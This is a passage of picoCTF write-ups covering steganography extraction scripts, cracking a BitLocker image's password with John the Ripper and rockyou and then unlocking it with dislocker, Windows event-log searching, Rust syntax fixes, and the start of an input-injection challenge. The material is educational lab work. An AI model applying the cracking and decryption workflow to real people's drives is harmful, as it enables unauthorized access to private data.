such a way that the first character of each line was a capital character and spelled C-H-E-C-K-L-S-B. Check LSB!  LSB, or Least Significant Bit, is the last bit of a binary integer. Given the other clues, I thought the glag might be split between the LSB of the different channels. I wrote a script using Python to extract the LSB of each channel and convert it to ASCII to see if there was anything hidden. </p> extract_lsb.py<pre><code>from PIL import Image\n\ndef extract_lsb(image_path):\n    img = Image.open(image_path)\n    pixels = list(img.getdata())\n\n    # For RGBA image\n    binary_result = \"\"\n    for pixel in pixels:\n        # Extract LSB from each channel (R,G,B,A)\n        for channel_value in pixel:\n            binary_result += str(channel_value &amp; 1)  # Get LSB\n\n    # Convert binary to ASCII (8 bits per character)\n    result = \"\"\n    for i in range(0, len(binary_result), 8):\n        if i + 8 &lt;= len(binary_result):\n            byte = binary_result[i:i+8]\n            result += chr(int(byte, 2))\n\n    return result\n\n# Extract and print the hidden data\nhidden_data = extract_lsb(\"red.png\")\nprint(hidden_data)\n</code></pre> <p>The script gives a base64 string that can be decoded using CyberChef (or added to the code if you want to adjust it) for the flag.</p> <p>Answer</p> <p>Inspect the LSB of the channels to find the hidden flag.</p>"},{"location":"Forensics/o3/","title":"flags are stepic","text":"<p>Difficulty:  Direct link: Objective 3 terminal</p>"},{"location":"Forensics/o3/#objective","title":"Objective","text":"<p>Description</p> <p>A group of underground hackers might be using this legit site to communicate. Use your forensic techniques to uncover their message.</p>"},{"location":"Forensics/o3/#hints","title":"Hints","text":"Hint 1 <p>In the country that doesn't exist, the flag persists</p>"},{"location":"Forensics/o3/#solution","title":"Solution","text":"<p>Start the instance and nagigate to the site that is provided. When you are there, it's a page of various flags. As far as I can tell, all of the flags were legitimate national flags with the exception of our target. </p> <p></p> <p>The page appears to be a list of flags</p> <p>Scrolling through the page, none of the flags appear to be interactive so the hidden inforamation has to be somewhere else. When I scrolled through the flags testing for operability, I found what I thought to be an interesting flag:</p> <p></p> <p>That's odd looking...</p> <p>\"Upanzi\" looks like an fake flag to me; especially the design. Lets look it up.</p> <p></p> <p>Google the 'network'</p> <p>Looks like I'm on the right track. With this information, I downloaded the image and then did a google search for the title 'stepic' to find out that it is a Python module for \"hiding arbitrary data\"</p> <p></p> <p>This is likely how the image is being modified</p> <p>I wrote a basic script using <code>stepic</code> to try retrieving any hidden messages:</p> extract.py<pre><code>import stepic\nfrom PIL import Image\n\nimg = Image.open('upz.png')\ndata = stepic.decode(img)\nprint(data)\n</code></pre> <p>Looks like that works!</p> <p>Answer</p> <p>Find the fake flag and use <code>stepic</code> to extract the hidden flag</p>"},{"location":"Forensics/o4/","title":"Bitlocker-1","text":"<p>Difficulty: </p>"},{"location":"Forensics/o4/#objective","title":"Objective","text":"<p>Description</p> <p>Jacky is not very knowledgable about the best security passwords and used a simple password to encrypt their BitLocker drive. See if you can break through the encryption!</p>"},{"location":"Forensics/o4/#hints","title":"Hints","text":"Hint 1 <p>Hash cracking</p>"},{"location":"Forensics/o4/#solution","title":"Solution","text":"<p>Well, we have a disk image that needs to be downloaded and a hint about hash cracking. We also have the title Bitlocker, which tells us a little about what to expect. BitLocker is a Windows security feature that encrypts data on a drive and can be used for entire volumes. The <code>.dd</code> is the encrypted drive. The goals for this challenge will be to extract the BitLocker recovery information, get the hash, and then break the hash.   There are tools specifically for these scenarios. One of the most popular cracking tools is John the Ripper which has a module called <code>bitlocker2john</code>. Use <code>sudo bitlocker2john -i bitlocker-1.dd &gt; bitlocker_hash.txt</code> to extract BitLocker information and save it to a text file for review. Open the result with <code>cat bitlocker_hash.txt</code> or use a text editor. You should see something similar to below.</p> bitlocker_hash.txt<pre><code>Encrypted device bitlocker-1.dd opened, size 100MB\nSalt: 2b71884a0ef66f0b9de049a82a39d15b\nRP Nonce: 00be8a46ead6da0106000000\nRP MAC: a28f1a60db3e3fe4049a821c3aea5e4b\nRP VMK: a1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58\n\nUP Nonce: d04d9c58eed6da010a000000\nUP MAC: 68156e51e53f0a01c076a32ba2b2999a\nUP VMK: fffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d\n\nUser Password hash:\n$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d\nHash type: User Password with MAC verification (slower solution, no false positives)\n$bitlocker$1$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999afffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d\nHash type: Recovery Password fast attack\n$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58\nHash type: Recovery Password with MAC verification (slower solution, no false positives)\n$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4ba1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58\n</code></pre> <p>Lets cover what this means. </p> <pre><code>1.  **Salt: 2b71884a0ef66f0b9de049a82a39d15b**\n    *   Salt used in the key derivation funtion when hashing the recovery password\n2.  **RP Nonce: 00be8a46ead6da0106000000**\n    *   Nonce associate with the Recovery Password. \n3.  **RP MAC: a28f1a60db3e3fe4049a821c3aea5e4b**\n    *   The Message Authentication Code for the Recovery Password.\n4.  **RP VMK: a1957baea68cd29488c0f3f6efcd4689e43f8ba3120a33048b2ef2c9702e298e4c260743126ec8bd29bc6d58**\n    *   The Volume Master Key associated with the recovery password\n5.  **UP Nonce: d04d9c58eed6da010a000000**\n    *   The Nonce associated with the User Password\n6.  UP MAC: 68156e51e53f0a01c076a32ba2b2999a\n    *   The Message Authentication Code for the User Password\n7.  UP VMK: fffce8530fbe5d84b4c19ac71f6c79375b87d40c2d871ed2b7b5559d71ba31b6779c6f41412fd6869442d66d\n    *   The Volume Master Key that is associated with the user password\n8.  User Password hash:\n    *   Contains the hash extracted for the User Password, formatted for use with John the Ripper\n\n9. - 11.    3 different hash types.\n</code></pre> <p>JohnTheRipper</p> <p>If you are using an operating system like Kali Linux or ParrotOS then JohnTheRipper is likely already installed. If you are using an operating system that is not necessarily geared towards security, you can use <code>sudo apt install john</code> to get the latest version.</p> <p>We need the User Password Hash to attempt to crack the password. Highlight and copy the line that begins with <code>$bitlocker$0</code> then use <code>echo</code> or open a text editor and paste the full line into a document called <code>user_pass_hash.txt</code>. We can then use John the Ripper and a basic wordlist such as the rockyou.txt. </p> John the Ripper<pre><code>sudo john --wordlist=/usr/share/wordlists/rockyou.txt user_pass_hash.txt\n</code></pre> <p>Wordlist</p> <p>This is my obligatory note about wordlists. If you are unfamiliar with password cracking and wordlists, it is a list of passwords that are used to compare a hash against. Once your program finds a matching hash, the password is known. This is typically a more efficient way to attempt password cracking than to attempt brute-forcing a password. However, a wordlist is only useful if it has the password your target used. There are many various wordlists available; SecList is an ideal one. There are also tools for creating custom wordlists which can be useful for narrowing the scope or focusing on specific targets. </p> <p></p> <p>This is the first match found</p> <p>The note states: \"This format may emit false positives, so it will keep trying even after finding a possible candidate\". This means the program will keep going as it is possible that there could be false positives. We aren't really worried about a false positive at this point, so lets assume we cracked Jacky's password. This isn't the end of the challenge though. This password doesn't fit our flag format, so there must be more that is needed. Since we only have an encrypted disk dump available, lets try to mount the <code>.dd</code>.  First, install <code>dislocker</code> if you don't already have it.</p> <pre><code>sudo apt install dislocker\n</code></pre> <p>Next, we need to create a couple of directories. We are going to make a directory named <code>mount</code> and then two subdirectories, <code>dislocker</code> and <code>bitlocker</code>:</p> <pre><code>mkdir -p mount/dislocker mount/bitlocker\n</code></pre> <p>Now we can use <code>dislocker</code> to decrypt the drive with the password we found:</p> <pre><code>sudo dislocker -v -V bitlocker-1.dd -u\"jacqueline\" -- ./mount/dislocker\n</code></pre> <ul> <li><code>sudo dislocker</code>: Dislocker is a tool used to read BitLocker-encrypted partitions. It needs sudo permissions to run similar John the Ripper.</li> <li><code>-v</code>: This is the \"verbose\" flag telling <code>dislocker</code> to provide more detailed output</li> <li><code>-V bitlocker-1.dd</code>: <code>-V</code> specifies the path to the BitLocker-encrypted disk image file</li> <li><code>-u\"jacqueline\"</code>: <code>-u</code> specifies the user password used to unlock the BitLocker volume</li> <li><code>-- ./mount/dislocker</code>: specifies the output file (or mount point) where the decrypted volume will be written. The mount directory must exist before running this command</li> </ul> <p></p> <p>The decrypted file will be <code>dislocker-file</code></p> <p>The volume should now be decrypted so that we can mount and navigate it, similar to any other volume. We'll use the below command to mount the volume to the mount point we created above after using <code>dislocker</code> to decrypt, then read the file found:</p> <pre><code>sudo mount -o loop mount/dislocker/dislocker-file mount/bitlocker\nls mount/bitlocker\ncat mount/bitlocker/flag.txt\n</code></pre> <p></p> <p>It should mount as read only, giving you unencrypted access to the volume</p> <p>Answer</p> <p>Use tools such as John the Ripper and <code>dislocker</code> to extract, crack, and use the password to decrypt a BitLocker encrypted volume.</p>"},{"location":"Forensics/o5/","title":"Event-Viewing","text":"<p>Difficulty:  Direct link: Windows Log File</p>"},{"location":"Forensics/o5/#objective","title":"Objective","text":"<p>Description</p> <p>One of the employees at your company has their computer infected by malware! Turns out every time they try to switch on the computer, it shuts down right after they log in. The story given by the employee is as follows:</p> <ol> <li>They installed software using an installer they downloaded online</li> <li>They ran the installed software but it seemed to do nothing</li> <li>Now every time they bootup and login to their computer, a black command prompt screen quickly opens and closes and their computer shuts down instantly.</li> </ol> <p>See if you can find evidence for the each of these events and retrieve the flag (split into 3 pieces) from the correct logs!</p>"},{"location":"Forensics/o5/#hints","title":"Hints","text":"Hint 1 <p>Try to filter the logs with the right event ID</p> Hint 2 <p>What could the software have done when it was ran that causes the shutdowns every time the system starts up?</p>"},{"location":"Forensics/o5/#solution","title":"Solution","text":"<p>At the time of completing this challenge, I did not have access to the Windows Forensics VM I used for other challenges. The easiest way to explore Windows Event Logs would probably be using a Windows machine but as you'll see here, it is not necessary. After a little research, I was able to install <code>python-evtx</code> and write a script to extract convert the <code>.evtx</code> to <code>.xml</code> for easier searching. </p> dump_evtx.py<pre><code>#!/usr/bin/env python3\nimport sys\nfrom xml.sax.saxutils import escape\nfrom evtx import PyEvtxParser\n\ndef main():\n    parser = PyEvtxParser(sys.argv[1])\n    print('&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?&gt;')\n    print('&lt;Events&gt;')\n    for record in parser.records_json():\n        print(record['data'])\n    print('&lt;/Events&gt;')\n\nif __name__ == '__main__':\n    main()\n</code></pre> <pre><code># make the script executable\nchmod +x dump_evtx.py\n# execute script\n./dump_evtx.py Windows_Logs.evtx &gt; windows_logs.xml\n</code></pre> <p>Now I can search the <code>windows_logs.xml</code> using <code>grep</code> to begin investigating the logs. Looking at the description, I first attempted various searches based on different Event IDs I thought might be relevant. This didn't lead to any new insights, so I tried searching for \"shutdown\" specifically, which led to my first success.</p> <pre><code>grep -A 20 '\"EventID\": 4688' windows_logs.xml\n</code></pre> <p></p> <p>Event IDs did not show me anything useful</p> <pre><code>grep -A 10 -B 10 \"shutdown\" windows_logs.xml\n</code></pre> <p></p> <p>Using \"shutdown\" was more successful</p> <p>Combing through the various Event IDs, nothing jumped out at me but when I searched with the keyword \"shutdown\" I noticed \"param 6\" looked like Base64. I grabbed the text and plugged it into CyberChef; the auto-bake option shows that I was correct about the Base64 encoding. </p> <p></p> <p>Base64 Auto-Bake shows a portion of the flag</p> <p>After finding this one, I thought about the challenge. I wasn't successful with some of the prelimenary searches I tried but what if I thought of the CTF and not the fabricated IOCs? Instead of searching for hidden signs, I assumed that the the other two components of the flag would also be base64 endcoded and searched for that.</p> Search for Base64 patterns<pre><code>grep -A 10 -B 10 \"==\" windows_logs.xml | grep -v \"Windows\"\n</code></pre> <p>  I copied the encoded text to CyberChef again, then assembled the flag in the correct order.</p> <p>Answer</p> <p>Use the appropriate tools to investigate the Windows Logs.</p>"},{"location":"General%20Skills/o1/","title":"FANTASY CTF","text":"<p>Difficulty:  Direct link: <code>nc verbal-sleep.picoctf.net 55628</code></p>"},{"location":"General%20Skills/o1/#objective","title":"Objective","text":"<p>Description</p> <p>Play this short game to get familiar with terminal applications and some of the most important rules in scope for picoCTF.  Connect to the program with netcat:</p>"},{"location":"General%20Skills/o1/#hints","title":"Hints","text":"Hint 1 <p>When a choice is presented like [a/b/c], choose one, for example: c and then press Enter.</p>"},{"location":"General%20Skills/o1/#solution","title":"Solution","text":"<p>This first challenge was a cute terminal game to lay out the basic rules of the challenge, as well as go over some of the basic operations. I wont be providing a walk through of this particular challenge but if you are unfamiliar with the platform, it can be helpful to play through the game.</p> <p>Answer</p> <p>Follow the story and answer the questions to learn about the picoCTF platform and rules.</p>"},{"location":"General%20Skills/o2/","title":"Rust fixme 1","text":"<p>Difficulty:  Download Rust file: Rust fixme 1</p>"},{"location":"General%20Skills/o2/#objective","title":"Objective","text":"<p>Description</p> <p>Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!</p>"},{"location":"General%20Skills/o2/#hints","title":"Hints","text":"Hint 1 <p>Cargo is Rust's package manager and will make your life easier. See the getting started page here</p> Hint 2 <p>println!</p> Hint 3 <p>Rust has some pretty great compiler error messages. Read them maybe?</p>"},{"location":"General%20Skills/o2/#solution","title":"Solution","text":"<p>This challenge introduces the Rust programming language and code review. The link in the hints leads to the official documentation for Cargo, Rust's build system and package manager, however I was unfamiliar with Rust. I had to start from the beginning and install Rust before being able to move forward. The steps were straight forward with the <code>curl</code> command provided. I also installed a C compiler per the recommendation.</p> <p></p> <p>Welcome to Rust</p> <p>With everything installed and a crash course on Rust completed, it's time to attempt the challenge. The code is provided as a .tar.gz to be downloaded. Use <code>tar -xvzf fixme1.tar.gz</code> to extract the <code>fixme1</code> directory. Within the <code>fixme1</code> directory find <code>main.rs</code> located in <code>src</code>. I use VSCode and VSCodium to review the code and test changes.</p> fixme1<pre><code>use xor_cryptor::XORCryptor;\n\nfn main() {\n    // Key for decryption\n    let key = String::from(\"CSUCKS\") // How do we end statements in Rust?\n\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\", \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"7f\", \"5a\", \"60\", \"50\", \"11\", \"38\", \"1f\", \"3a\", \"60\", \"e9\", \"62\", \"20\", \"0c\", \"e6\", \"50\", \"d3\", \"35\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    // Create decrpytion object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        ret; // How do we return in rust?\n    }\n    let xrc = res.unwrap();\n\n    // Decrypt flag and print it out\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    println!(\n        \":?\", // How do we print out a variable in the println function? \n        String::from_utf8_lossy(&amp;decrypted_buffer)\n    );\n}\n</code></pre> <p>There are some obvious corrections that need to be made based on the comments. On line 5 we see a question about how to end statements, line 18 ask how to return and line 25 asks how to print a variable. We can also run <code>cargo check</code> to see the error output.</p> <p></p> <p>The errors point to some of the same issues we can assume from the comments</p> <p>We can use the command provided for more information on the error as well as return to the Rust documentation. we can find the answer under the heading Anatomy of a Rust Program</p> <p><code>rustc --explain E0425</code> tells us that the error is related to \"An unresolved name was used.\" It then offers some code examples to help find where the error might have occured. Checking documentation tells us that most Rust code needs to end in a semicolon, which we can see is missing from line 5 and that the error message further corroberates.</p> <p></p> <p>Most lines of Rust code end in a semicolon</p> <p></p> <p>The error message is pretty clear on what needs to be fixed here</p> <p>Digging through the  documentation a little more with help of Google searches, I found keyword documentation for <code>return</code>. I used a copy/paste version of one of the examples on line 18 to correct the return of the <code>res</code> function.</p> Return update<pre><code>let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return Err(Error::new(ErrorKind::Other, \"XORCryptor error\"));\n    }\n</code></pre> <p>Finally, line 25 needs to print a variable. One of the hints provides a link to the <code>println!</code> macro where there are some useful examples of using <code>println!</code> with a variable. I started with just inserting curly braces <code>{}</code>.</p> Printing a variable with println!<pre><code>let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    println!(\n        \": {}\",\n    );\n</code></pre> <p>Time to put it all together. Use <code>cargo check</code> to see if all the errors have been fixed. </p> <p></p> <p>error E0433</p> <p>Seems I missed something. The use of the error types I copied from the documentation require input of dependencies. In this case <code>use std::io::ErrorKind;</code> &amp; <code>use std::io::Error;</code> were used at the top of the code and were helpfully suggested by the error messages from Rust. Turns out though, I was over complicating the issue. Attempting to run the new code still produced an error. </p> <p></p> <p>New error E0308</p> <p>This time I received an expected unit type message. Deleting all of my previous attempts, I made the return just parentheses:</p> Updated return<pre><code>let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return ();\n    }\n</code></pre> <p>This time it worked! <code>cargo check</code> command returned no errors. Looks like it's time to run it. If succesful, it should present the unencrypted flag.</p> <p></p> <p>no errors</p> <p>To run the Rust code, we'll use <code>cargo run</code></p> <p></p> <p>With the code fixed we can copy our flag</p> <p>Code Review &amp; AI</p> <p>I think it is important to note that Large Language Models such as ChatGPT from OpenAI and claude from Anthropic can be invaluable tools for code review or learning. Using them for short code review and refactoring can be a massive accelerator to effective code, production and understanding. The caveat is that the user must craft the prompts with these goals in mind. There is an extensive conversation around \"AI\", it's training and the ethical use thereof, that is beyond the scope of this note, but it is worth being aware of it and to use the tools available to us as hackers. If reading official documentation feels daunting, or a particular aspect is confusing, paste it into a chatAI and ask for a simplified explanation with examples and sources. Use this to augment your skills as you  would any other resource. </p> <p>Answer</p> <p>Review the provided code, correcting and completing it to execute without error and provide the flag</p>"},{"location":"General%20Skills/o3/","title":"Rust fixme 2","text":"<p>Difficulty:  Download Rust file: Rust fixme 2</p>"},{"location":"General%20Skills/o3/#objective","title":"Objective","text":"<p>Description</p> <p>The Rust saga continues? I ask you, can I borrow that, pleeeeeaaaasseeeee?</p>"},{"location":"General%20Skills/o3/#hints","title":"Hints","text":"Hint 1 <p>https://doc.rust-lang.org/book/ch04-02-references-and-borrowing.html</p>"},{"location":"General%20Skills/o3/#solution","title":"Solution","text":"<p>Similar to fixme1 this challenge presents us with a zipped Rust file to review and correct. We'll start the same as before, downloading the file and unzipping with <code>tar -xzvf fixme2.tar.gz</code> and then <code>cd fixme2</code>. Open <code>main.rs</code> with an IDE of your choice; I use VSCode and VSCodium for this write up.</p> <p></p> <p>Unzip and navigate to <code>main.rs</code></p> <p>Opening <code>main.rs</code> we can review our new code:</p> fixme 2 main.rs<pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &amp;String){ \n    // How do we pass values to a function that we want to change?\n\n    // Key for decryption\n    let key = String::from(\"CSUCKS\");\n\n    // Editing our borrowed value\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    // Create decrpytion object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return; // How do we return in rust?\n    }\n    let xrc = res.unwrap();\n\n    // Decrypt flag and print it out\n    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n    borrowed_string.push_str(&amp;String::from_utf8_lossy(&amp;decrypted_buffer));\n    println!(\"{}\", borrowed_string);\n}\n\nfn main() {\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"01\", \"1c\",\n     \"7e\", \"59\", \"63\", \"e1\", \"61\", \"25\", \"0d\", \"c4\", \"60\", \"f2\", \"12\", \"a0\", \"18\",\n     \"03\", \"51\", \"03\", \"36\", \"05\", \"0e\", \"f9\", \"42\", \"5b\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let party_foul = String::from(\"Using memory unsafe languages is a: \"); // Is this variable changeable?\n    decrypt(encrypted_buffer, &amp;party_foul); // Is this the correct way to pass a value to a function so that it can be changed?\n}\n</code></pre> <p>fixme 1</p> <p>It is assumed that you have completed the fixme1 challenge prior to fixme2. As such, this challenge builds off of the previous.</p> <p>The comments provide some prompts to begin our review starting on line 3 \"How do we pass values to a function that we want to change?\". The hint for this challenge is a link to the Rust documentation, specifically chapter 4.2 discussing \"References and Borrowing\". It's also helpful to use the <code>cargo check</code> command.</p> <p></p> <p>error E0596</p> <p>Not only does Rust have useful error messages, but more importantly, they come with suggestions for correction. Following the suggestions, make the <code>&amp;String</code> mutable by adding <code>&amp;mut</code> as shown in the help text.  We'll need to make the changes at line 3 so it looks like the snippet below. While we are editing, I went ahead and added the parentheses <code>()</code> to line 14 which we learned during the previous challenge. </p> Mutable change<pre><code>// line 3\nfn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &amp;mut String){\n\n/// line 14\nreturn ();\n</code></pre> <p>Taking a methodical approach, save the file and run <code>cargo check</code> again. This time we get <code>error[E0308]: mismatched types</code>. The error points to the error happening on line 35, tells us what the expectation is, and tells us where the function was defined. </p> <p></p> <p>error E308</p> <p>Using the suggested change, I tried to add <code>&amp;mut</code> to line 35 so it looks like this:</p> Correct mismatched types<pre><code>decrypt(encrypted_buffer, &amp;mut party_foul);\n</code></pre> <p>Run <code>cargo check</code> again to see an error for line 34</p> <p></p> <p>error E0596 and a suggestion for the fix</p> <p>Update line 34 to match the help suggestion</p> Declare mutable<pre><code>let mut party_foul = String::from(\"Using memory unsafe languages is a: \");\n</code></pre> <p>Run <code>cargo check</code> one more time to confirm that there are no more errors, then execute the code with <code>cargo run</code>. </p> <p></p> <p>Party Foul</p> <p>Answer</p> <p>Use Rust's error responses to correct the code and decrypt the flag.</p>"},{"location":"General%20Skills/o4/","title":"Rust fixme 3","text":"<p>Difficulty:  Download Rust file: Rust fixme 3</p>"},{"location":"General%20Skills/o4/#objective","title":"Objective","text":"<p>Description</p> <p>Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!</p>"},{"location":"General%20Skills/o4/#hints","title":"Hints","text":"Hint 1 <p>Read the comments...darn it!</p>"},{"location":"General%20Skills/o4/#solution","title":"Solution","text":"<p>This is the final installment of the Rust Fixme challenges. It starts like fixme1 and fixme2; we'll download the zipped source code, unzip it, open it in a code editor, and run <code>cargo check</code> to see what we are working with.</p> Initial code<pre><code>use xor_cryptor::XORCryptor;\n\nfn decrypt(encrypted_buffer: Vec&lt;u8&gt;, borrowed_string: &amp;mut String) {\n    // Key for decryption\n    let key = String::from(\"CSUCKS\");\n\n    // Editing our borrowed value\n    borrowed_string.push_str(\"PARTY FOUL! Here is your flag: \");\n\n    // Create decryption object\n    let res = XORCryptor::new(&amp;key);\n    if res.is_err() {\n        return;\n    }\n    let xrc = res.unwrap();\n\n    // Did you know you have to do \"unsafe operations in Rust?\n    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html\n    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules\n    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective\n\n    // unsafe {\n        // Decrypt the flag operations \n        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);\n\n        // Creating a pointer \n        let decrypted_ptr = decrypted_buffer.as_ptr();\n        let decrypted_len = decrypted_buffer.len();\n\n        // Unsafe operation: calling an unsafe function that dereferences a raw pointer\n        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);\n\n        borrowed_string.push_str(&amp;String::from_utf8_lossy(decrypted_slice));\n    // }\n    println!(\"{}\", borrowed_string);\n}\n\nfn main() {\n    // Encrypted flag values\n    let hex_values = [\"41\", \"30\", \"20\", \"63\", \"4a\", \"45\", \"54\", \"76\", \"12\", \"90\", \"7e\", \"53\", \"63\", \"e1\", \"01\", \"35\", \"7e\", \"59\", \"60\", \"f6\", \"03\", \"86\", \"7f\", \"56\", \"41\", \"29\", \"30\", \"6f\", \"08\", \"c3\", \"61\", \"f9\", \"35\"];\n\n    // Convert the hexadecimal strings to bytes and collect them into a vector\n    let encrypted_buffer: Vec&lt;u8&gt; = hex_values.iter()\n        .map(|&amp;hex| u8::from_str_radix(hex, 16).unwrap())\n        .collect();\n\n    let mut party_foul = String::from(\"Using memory unsafe languages is a: \");\n    decrypt(encrypted_buffer, &amp;mut party_foul);\n}\n</code></pre> <p></p> <p>error E1033</p> <p>As seen above, the code builds off the previous two versions and added some comments to point us in the right direction, including another chapter of the Rust documentation that discusses \"unsafe rust\" and the use thereof.</p> <p>Unsafe Rust</p> <p>Rust has a second language hidden inside it that doesn\u2019t enforce these memory safety guarantees: it\u2019s called unsafe Rust and works just like regular Rust, but gives us extra superpowers.</p> <p>Unsafe Rust has five main actions, called unsafe superpowers in the documentation, that allow you to access the five features that are not checked by the compiler for memory safety, allowing a programmer to tell the compiler that the code is safe. It also allows the programmer to interact directly with the operating system or write their own os. </p> <p>Risks</p> <p>If you use unsafe code incorrectly, problems can occur due to memory unsafety, such as null pointer dereferencing</p> <p>Be sure to read the rest of chapter 20.1 to get a deeper understanding of unsafe Rust and its uses. Taking a hint from the previous challenges, I started my code editing by just removing the comments at lines 22 and 34.</p> <p></p> <p>The check was successful</p> <p>That's promissing. Lets run it with the <code>cargo run</code> command to get the flag.</p> <p></p> <p>Now we can call ourselves Rustaceans </p> <p>Answer</p> <p>Implement unsafe Rust to retrieve the flag</p>"},{"location":"Reverse%20Engineering/o1/","title":"Flag Hunters","text":"<p>Difficulty:  Direct connect with <code>netcat</code>: <code>nc verbal-sleep.picoctf.net 61138</code> Download sourceSource</p>"},{"location":"Reverse%20Engineering/o1/#objective","title":"Objective","text":"<p>Description</p> <p>Lyrics jump from verses to the refrain kind of like a subroutine call. There's a hidden refrain this program doesn't print by default. Can you get it to print it? There might be something in it for you.</p>"},{"location":"Reverse%20Engineering/o1/#hints","title":"Hints","text":"Hint 1 <p>This program can easily get into undefined states. Don't be shy about Ctrl-C.</p> Hint 2 <p>Unsanitized user input is always good, right?</p> Hint 3 <p>Is there any syntax that is ripe for subversion?</p>"},{"location":"Reverse%20Engineering/o1/#solution","title":"Solution","text":"<p>Lets start with checking the source code. Looks like we can execute the code locally if we have a <code>flag.txt</code> file in the same directory. Use <code>echo</code> to create the file with something similar to the command below. Be sure you are in the same directory that <code>lyric-reader.py</code> is in:</p> Make flag.txt<pre><code>echo \"picoCTF{dummy_flag_here}\" &gt; flag.txt\n</code></pre> <p>Analyzing the code, there are some things to take note of:</p> <ol> <li>Loads the flag from <code>flag.txt</code> and embeds it in the 'secret intro' section</li> <li><code>reader</code> function processes lyrics with specific control characters:<ul> <li><code>REFRAIN</code> jumps to the refrain section</li> <li><code>RETURN</code> jumps back to where the <code>REFRAIN</code> was called from</li> <li><code>CROWD</code> prompts for user input</li> <li><code>END</code> terminates execution</li> </ul> </li> </ol> <p>Based on the hints, we are looking for unsanitized input vulnerability. That would imply that the specific piece of vulnerable code is:</p> Vulnerability<pre><code>elif re.match(r\"CROWD.*\", line):\n    crowd = input('Crowd: ')\n    song_lines[lip] = 'Crowd: ' + crowd\n</code></pre> <p>Something that we don't actually see happening anywhere is the secret verse getting called. It is assigned to the variable <code>secret_intro</code> and concatanated with <code>flag</code> in lines 8-13: </p> secret_intro variable<pre><code>secret_intro = \\\n'''Pico warriors rising, puzzles laid bare,\nSolving each challenge with precision and flair.\nWith unity and skill, flags we deliver,\nThe ether\u2019s ours to conquer, '''\\\n+ flag + '\\n'\n</code></pre> <p>and it is referenced on line 16 when assigned to the variable <code>song_flag_hunters</code>:</p> song_flag_hunters variable<pre><code>song_flag_hunters = secret_intro +\\\n</code></pre> <p>When looking at how the <code>reader</code> function is built, it takes two arguments; <code>def reader(song, startLabel):</code>. The function expects the first input to be the song, which is \"song_flag_hunters\" here and the second input to be the startLabel. When the <code>reader</code> function is called with <code>reader(song_flag_hunters, '[VERSE1]')</code> [VERSE1] is provided as the second argument, meaning our startLabel variable is assigned as [VERSE1]. Mapping the code visually can be helpful to understand what it is designed to do before trying to manipulate it's flow.</p> <pre><code>graph TD\n    Start([\"Start at [VERSE1]\"]) --&gt;|Read line| CheckSpecial{Is line a special command?}\n    CheckSpecial -- \"REFRAIN\" --&gt; JumpRefrain[\"Jump to [REFRAIN] Section\"]\n    JumpRefrain --&gt; |Return to previous point| ReturnPoint\n    CheckSpecial -- \"RETURN\" --&gt; JumpReturn[\"Jump to stored return point\"]\n    JumpReturn --&gt; ReturnPoint\n    CheckSpecial -- \"CROWD\" --&gt; CrowdInput[\"Prompt user for input\"]\n    CrowdInput --&gt; ModifyLyric[\"Modify line with user input\"]\n    ModifyLyric --&gt; NextLine\n    CheckSpecial -- \"END\" --&gt; End([\"Terminate Execution\"])\n    CheckSpecial -- \"Regular Line\" --&gt; PrintLine[\"Print Line\"]\n    PrintLine --&gt; NextLine\n    NextLine --&gt; |Increment line| CheckLimit{Reached MAX_LINES?}\n    CheckLimit --\"No\"--&gt; CheckSpecial\n    CheckLimit --\"Yes\"--&gt; End</code></pre> <p>Now we have a visual flowchart of the source code. We can execute the source code locally to start testing payloads and getting a feel for the responses.</p> 